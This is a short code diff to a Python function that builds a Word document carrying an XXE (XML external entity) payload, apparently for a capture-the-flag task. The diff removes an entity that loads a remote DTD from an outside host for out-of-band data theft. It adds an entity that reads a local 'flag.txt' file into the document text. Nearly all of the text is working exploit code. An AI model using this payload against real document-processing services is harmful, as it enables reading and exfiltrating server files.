@@ -6,14 +6,13 @@ def create_xxe_docx():
     
     document_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <!DOCTYPE w:document [
-  <!ENTITY % remote SYSTEM "http://file_holder/sender.dtd">
-  %remote;
+  <!ENTITY xxe SYSTEM "file:///home/vegan/flag.txt">
 ]>
 <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
   <w:body>
     <w:p>
       <w:r>
-        <w:t>&send;</w:t>
+        <w:t>FLAG: [&xxe;]</w:t>
       </w:r>
     </w:p>
   </w:body>
